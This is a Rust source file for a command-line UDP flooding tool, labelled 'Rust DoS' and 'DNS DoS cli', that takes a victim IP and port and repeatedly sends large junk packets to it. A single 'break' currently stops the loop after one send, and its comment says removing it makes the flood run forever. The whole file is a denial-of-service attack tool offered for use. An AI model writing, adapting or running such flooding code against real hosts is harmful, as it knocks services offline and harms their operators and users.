#[allow(unreachable_code)]

use std::{io::{stdout, Write}, thread::sleep,time::Duration};
use clap::{Arg, ArgAction, Command};
use std::net::UdpSocket;
// use std::env;


fn main() -> std::io::Result<()>
{
    // env::set_var("RUST_BACKTRACE", "1");
    let matches = Command::new("Rust DoS")
        .about("DNS DoS cli")
        .version("1.0")
        .author("Raaven")
        .disable_help_flag(true)
        .arg(Arg::new("victim-ip")
            .short('X')
            .long("victim-ip")
            .help("Set the IP that will be flooded with packets. IP:PORT")
            .required(true))
        .arg(Arg::new("host-ip")
            .short('H')
            .long("host-ip")
            .help("Set the host IP to send packets. IP:PORT")
            .default_value("0.0.0.0:4444"))
        .arg(Arg::new("help")
            .short('h')
            .long("help")
            .global(true)
            .action(ArgAction::Help)).get_matches();
    
    println!("\nVictim-IP: {:?}\nHost-IP: {:?}", matches.get_one::<String>("victim-ip").unwrap(), matches.get_one::<String>("host-ip").unwrap());

    {
        // create socket on self
        let host = matches.get_one::<String>("host-ip").unwrap();
        let socket = UdpSocket::bind(&host).expect("Couldn't bind to address");

        //connect to victim server
        let victim = matches.get_one::<String>("victim-ip").unwrap();
        // socket.connect(&victim).expect("connect function failed");

        //send packets to server
        let mut buf : [u8; 8104] = [0; 8104] ;

        for b in (0..8103).step_by(3)
        {
            buf[b] = b'p';
            buf[b+1] = b'o';
            buf[b+2] = b'g';

            if b + 4 > 8104 {break}
        }

        let mut bytes = 0;
        let mut stdout = stdout();

        loop
        {
            match socket.send_to(&buf, victim) {
                Ok(number_of_bytes) => 
                {
                    bytes += number_of_bytes;

                    print!("\rBytes sent: {:?}", bytes);

                    stdout.flush().unwrap();
                    sleep(Duration::from_millis(200));
                },
                Err(fail) => 
                {
                    println!("failed sending {:?}", fail);
                    break;
                }
            }
            break; //remove to continue infinite loop
        }

        
    } // socket closes here

    Ok(())
}
